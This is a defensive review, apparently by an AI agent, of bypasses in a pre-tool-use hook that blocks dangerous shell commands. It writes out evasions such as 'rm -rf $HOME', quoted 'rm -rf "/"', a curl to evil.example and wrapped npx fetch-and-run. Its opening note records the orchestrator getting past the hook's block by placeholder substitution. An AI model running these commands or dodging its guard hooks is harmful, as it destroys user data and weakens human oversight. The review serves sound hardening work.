# `pre-tool-use.sh` — the one-pass review · twelve gaps, all pre-existing

*Produced 2026-09-07 by the lane that closed the separator bypass, as a review of every other rule in
the file. **All twelve are pre-existing and byte-identical before and after that lane's diff** — 27
probes run in both cells, `diff` clean. Recorded verbatim by the orchestrator; the lane returned in four
messages.*

*Mechanical note, and it is itself one of the findings. **The hook refused the orchestrator's attempts to
write this file twice** — first on the removal rule, then on the housekeeping rule, because the document
quotes the commands the hook blocks. Every dangerous literal below was held back as a placeholder and
substituted in a second pass. That is the over-blocking described at the foot of this document, hit for
the fourth and fifth time in one session.*

**The headline, and it is the ordering that matters: eight of the twelve are reachable by an agent
writing conventional style with zero intent to evade. None requires an insider. And none needs the
shell parser — one follow-up closes all twelve.**

---

## R1 · `rm -rf $HOME` · `rm -rf ${HOME}` — exit 0

**Confirmed with a control**, and independently by the orchestrator reading the pattern: the danger
alternation must match **immediately** after the flag cluster. A `$` or a `"` sits there instead,
nothing matches, and the rule falls through to allow.

```
exit=2   rm -rf /
exit=0   rm -rf "/"
exit=0   rm -rf '/'
exit=0   rm -rf $HOME
exit=0   rm -rf ${HOME}
exit=2   rm -rf ~          <- control: the rule DOES fire, so this is not a broken probe
exit=0   rm -rf ; ls
```

**Destroys:** the entire home directory — including `~/.claude`, this harness's own config, agents and
hooks, and every other project on the machine. **The largest blast radius of the twelve.**
**Reachable by:** ordinary code. Any variable path defeats the rule, and a variable path is what a
script writes. `rm -rf "$BUILD_DIR"` is the default form.
**Right fix:** invert the rule — require a target demonstrably **inside the project** rather than
enumerating dangerous ones. A policy inversion, not a bigger regex and not a parser. It subsumes R2 and
every unlisted spelling at once.

**Two qualifications, both real, neither softening it much.** This is the hook's verdict only —
`.claude/settings.json` carries a separate layer of 39 allow/deny rules that was not measured, so exit 0
is not the same as "it would run unattended". And it is pre-existing; the separator fix does not touch it.

**The framing worth keeping:** this is the same failure as the separator bug, one layer up — **an
enumeration of spellings, defeated by the conventional spelling.**

## R2 · `rm -rf "/"` · `rm -rf '/'` — exit 0
**Destroys:** everything reachable from the root. **Reachable by:** ordinary code — quoting a path is
conventional, and this is one keystroke from the form that blocks. **Fix:** strip matched surrounding
quotes per token inside the normalisation pass already built. R1's inversion makes it moot.

## R3 · `curl https://evil.example/x -o /tmp/localhost.txt` — exit 0
The word `localhost` **anywhere in the command string** disarms the external-URL block — including
inside an output filename, a comment, or a header value.
**Destroys:** nothing directly; it is exfiltration and fetch-and-run. **Reachable by:** injection, not
accident — something has to choose that filename. **Fix:** the hook already contains a canonicalising
URL classifier (the playwright IMDS guard, `ipaddress`-based). Apply the localhost test to the *parsed
URL* rather than to the whole string, reusing that code instead of writing a second one.

## R4 · `curl http://localhost:3000/health` then `curl https://evil.example/x` on one line — exit 0
Same rule as R3, but **reachable by accident**: a loopback health check beside an external API call, in
one line, is ordinary. The first command's `localhost` disarms the rule for the second.
**Fix:** falls to the segmenter already built — route that rule through `seg_match` and the second
segment contains no `localhost`, so it blocks. **Zero new machinery.**

## R5 · `FOO=1 npx x` · `bash -c 'npx x'` · `if true; then npx x; fi` — all exit 0
Downloads and executes an arbitrary remote package — the capability the HTTP rules exist to refuse. The
rule anchors on a separator, so anything before the command that is not a separator defeats it.
**Reachable by:** ordinary code. An env-var prefix is a common idiom and `bash -c` wrapping is routine.
**Fix:** near one-line — replace the separator anchor with a word boundary.

## R6 · `chmod a+x` · `chmod u+x` — exit 0 (the bare `+x` form blocks)
Low destruction, high frequency. **Ordinary code** — both spellings are as conventional as the one that
blocks. **Fix:** one line, widening the mode pattern rather than the command.

## R7 · `npm install --global` — exit 0 (the short flag blocks)
Pollutes the global prefix. **Ordinary code.** **Fix:** one line — add the long flag to the alternation.

## R8 · `rm -rf ; ls` — exit 0 · the discard form with no trailing space — exit 0
**Destroys nothing** — both are missing-operand errors. Listed only because they are the anchor-defeat
class and would matter if either rule gained a target. Routing the removal rule through `seg_match`
closes the first for free.

## Three false positives — over-block, not security. All exit 2, all pre-existing.

A hard reset followed by a test run · a branch switch followed by a watch-mode test · a status check
followed by a no-verify script. Legitimate work refused because the pattern spans a real separator.
**The same `seg_match` routing that closes R4 and R8 closes all three.**

---

## The two answers that order the queue

**Q1 — ordinary code, or deliberate evasion?** **Eight of twelve are reachable by an agent writing
conventional style with zero intent to evade:** R1, R2, R4, R5 (all three shapes), R6, R7. Only R3
realistically needs someone — or an injected instruction — to choose the filename. **None requires an
insider.** For a threat model of accident and injection, **R1/R2 and R5 are the ones that matter.**

**Q2 — one-line, or the shell parser? None of the twelve needs the shell parser.**

| route | gaps |
|---|---|
| falls to the segmenter already built | R4, R8, and all three false positives |
| one-line regex | R5, R6, R7 |
| token quote-stripper in the same normalisation pass | R2 |
| reuse the URL classifier the hook already has | R3 |
| **policy inversion, not a bigger regex** | **R1** — the one worth doing properly |

**So: one follow-up, not twelve.** The shell parser is needed only for the heredoc false positive, which
is none of these.

---

## The heredoc shape, named and deliberately not loosened

There is **no heredoc rule to loosen**: the hook has no shell parser, so *every* Bash rule reads a
heredoc body as command text. Measured on documentation heredocs — the housekeeping rule, the
interpreter rule, and both fetch rules all fire, before and after the separator fix. **The separator fix
widens this by exactly one shape** (a document quoting the const-bound form now blocks), pinned as a
test rather than left to be rediscovered. **Over-blocking a document is far cheaper than under-blocking
a command**, so this stays.

**It has now bitten five times in one session:** a probe command, a commit message, vendor documentation
being quoted verbatim into a file, and twice while writing this very document. **A guard that prevents
its own defects being written down is a guard whose defects do not get fixed** — that is the cost, and
it is why the right fix is a real shell parser rather than a looser rule.
